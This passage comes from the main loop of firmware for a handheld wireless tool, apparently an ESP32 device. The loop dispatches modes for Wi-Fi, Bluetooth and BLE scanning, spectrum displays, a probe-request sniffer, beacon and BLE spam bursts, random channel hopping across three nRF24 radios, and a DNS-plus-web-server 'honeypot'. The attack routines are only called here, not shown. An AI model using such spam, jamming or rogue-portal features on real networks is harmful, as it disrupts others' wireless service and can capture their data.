      RadioA.setChannel(channel);
      RadioB.setChannel(channel);
      RadioC.setChannel(channel);
    } else if (current_Mode == NRF24_MODULE) {
      int randomIndex = random(0, sizeof(nrf24_channels) / sizeof(nrf24_channels[0]));
      byte channel = nrf24_channels[randomIndex];
      RadioA.setChannel(channel);
      RadioB.setChannel(channel);
      RadioC.setChannel(channel);
    } else if (current_Mode == BLE_SPECTRUM_MODULE && current == ACTIVE_MODE) {
      renderBleSpectrumFrame();
    } else if (current_Mode == WIFI_SPECTRUM_MODULE && current == ACTIVE_MODE) {
      renderWifiSpectrumFrame();
    } else if (current_Mode == SPECTRUM_AIO_MODULE && current == ACTIVE_MODE) {
      renderSpectrumAioFrame();
    } else if (current_Mode == SPY_LOCATE_MODULE && current == ACTIVE_MODE) {
      renderSpyLocateFrame();
    } else if (current_Mode == INFO_MODULE && infoState == INFO_SYSTEM) {
      renderInfoSystem();
    } else if (current_Mode == BRICKWISE_MODULE && brickwiseState == BW_PLAYING) {
      bwUpdate();
      if (brickwiseState == BW_PLAYING) {
        bwRenderPlaying();
      } else if (brickwiseState == BW_GAME_OVER) {
        bwRenderGameOver();
      }
    } else if (current_Mode == WIFI_SCANNER_MODULE && current == ACTIVE_MODE) {
      setActivityPixel(0, true);
      runWifiScan();
      if (wifiScanPage >= wifiScanTotalPages()) wifiScanPage = 0;
      renderWifiScanResults(wifiScanPage);
      setActivityPixel(wifiScanCount > 0 ? 100 : 0, true);
    } else if (current_Mode == BT_SCANNER_MODULE && current == ACTIVE_MODE) {
      setActivityPixel(0, true);
      runBtScan();
      if (btScanPage >= btScanTotalPages()) btScanPage = 0;
      renderBtScanResults(btScanPage);
      setActivityPixel(btScanCount > 0 ? 100 : 0, true);
    } else if (current_Mode == BLE_SCANNER_MODULE && current == ACTIVE_MODE) {
      setActivityPixel(0, true);
      runBleScan();
      if (bleScanPage >= bleScanTotalPages()) bleScanPage = 0;
      renderBleScanResults(bleScanPage);
      setActivityPixel(bleScanCount > 0 ? 100 : 0, true);
    } else if (current_Mode == PROBE_SNIFFER_MODULE && current == ACTIVE_MODE) {
      pruneAndSortProbeList();
      if (probeScanPage >= probeSniffTotalPages()) probeScanPage = 0;
      renderProbeSniffResults(probeScanPage);
      setActivityPixel(probeCount > 0 ? 100 : 0, true);
      delay(150);
    } else if (current_Mode == BEACON_SPAM_MODULE && current == ACTIVE_MODE) {
      sendBeaconSpamBurst();
      renderBeaconSpamFrame();
      delay(200);
    } else if (current_Mode == BLE_SPAM_MODULE && current == ACTIVE_MODE) {
      sendBleSpamBurst();
      renderBleSpamFrame();
    } else if (current_Mode == TRAFFIC_MON_MODULE && current == ACTIVE_MODE) {
      renderTrafficMonFrame();
      delay(150);
    } else if (current_Mode == HONEYPOT_MODULE && current == ACTIVE_MODE) {
      honeypotDns.processNextRequest();
      honeypotServer.handleClient();
      static unsigned long lastHoneypotRender = 0;
      if (millis() - lastHoneypotRender > 300) {
        renderHoneypotHistory(honeypotPage);
        lastHoneypotRender = millis();
      }
    }
}
